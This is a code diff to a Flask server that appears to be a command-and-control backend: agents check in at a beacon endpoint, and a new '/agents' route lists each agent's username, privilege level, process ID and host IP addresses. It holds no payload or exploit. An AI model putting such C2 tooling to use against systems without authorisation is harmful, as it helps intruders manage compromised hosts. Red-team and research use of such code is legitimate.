@@ -32,15 +32,11 @@ def beacon():
     results = json_data.get("results", [])
 
     if not paw:
-        print("[DEBUG] Missing agent ID")
         return jsonify({"error": "Missing agent ID"}), 400
 
     agent = agents.get(paw)
 
-    if agent:
-        print("[DEBUG] Agent found:", paw)
-    else:
-        print("[DEBUG] New Agent:", paw)
+    if not agent:
         agent = {"paw": paw, "info": data, "instructions": []}
         agents[paw] = agent
 
@@ -48,8 +44,6 @@ def beacon():
         commandId = result.get("id")
         if commandId in commandEvents:
             commandEvents[commandId].set()
-        output = result.get("output")
-        decoded_output = decode_base64(output)
 
     agent["results"] = results
 
@@ -74,10 +68,23 @@ def beacon():
 # Get agents
 @app.route("/agents", methods=["GET"])
 def get_agents():
-    agents_list = []
+    agents_list = {}
+    for paw, data in agents.items():
+        try:
+            decoded_info = decode_base64(data["info"])
+            parsed_info = json.loads(decoded_info)
 
-    for paw, _ in agents.items():
-        agents_list.append(paw)
+            agents_list[paw] = {
+                "paw": paw,
+                "username": parsed_info.get("username"),
+                "privilege": parsed_info.get("privilege"),
+                "pid": parsed_info.get("pid"),
+                "host_ip_addrs": parsed_info.get("host_ip_addrs"),
+            }
+        except (base64.binascii.Error, UnicodeDecodeError) as exc:
+            raise ValueError(f"Invalid base64 data: {exc!r}")
+        except json.JSONDecodeError as exc:
+            raise ValueError(f"Malformed JSON: {exc!r}")
 
     return jsonify(agents_list)
 
